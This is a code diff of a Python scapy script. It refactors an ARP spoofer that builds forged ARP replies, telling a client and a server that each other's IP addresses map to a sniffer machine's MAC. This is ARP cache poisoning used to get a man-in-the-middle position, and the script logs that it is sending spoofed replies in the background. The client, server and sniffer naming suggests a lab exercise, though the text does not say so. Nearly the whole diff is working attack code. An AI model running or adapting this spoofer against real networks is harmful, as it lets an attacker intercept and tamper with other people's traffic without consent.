@@ -1,25 +1,32 @@
 import time
 from scapy.all import ARP, sendp, Ether, get_if_hwaddr
 
-def run_spoofer(interface, ip_list):
-  info = {item['name']: item for item in ip_list}
+def run_spoofer(interface, ip_dist):
+  for ip, info in ip_dist.items():
+    if info['name'] == 'client':
+      client_ip = ip
+      client_mac = info['mac']
+    elif info['name'] == 'server':
+      server_ip = ip
+      server_mac = info['mac']
+    elif info['name'] == 'sniffer':
+      sniffer_mac = info['mac']
 
   # To client (server's MAC -> my MAC)
-  arp_to_client = Ether(dst=info['client']['mac']) / ARP(
+  arp_to_client = Ether(dst=client_mac) / ARP(
     op=2,
-    pdst=info['client']['ip'],
-    hwdst=info['client']['mac'],
-    psrc=info['server']['ip'],
-    hwsrc=info['sniffer']['mac'],
+    pdst=client_ip,
+    hwdst=client_mac,
+    psrc=server_ip,
+    hwsrc=sniffer_mac
   )
-
   # To server
-  arp_to_server = Ether(dst=info['server']['mac']) / ARP(
+  arp_to_server = Ether(dst=server_mac) / ARP(
     op=2,
-    pdst=info['server']['ip'],
-    hwdst=info['server']['mac'],
-    psrc=info['client']['ip'],
-    hwsrc=info['sniffer']['mac'],
+    pdst=server_ip,
+    hwdst=server_mac,
+    psrc=client_ip,
+    hwsrc=sniffer_mac
   )
   print("[Sniffer Log] [+] Started sending spoofed ARP replies in the background.")
 
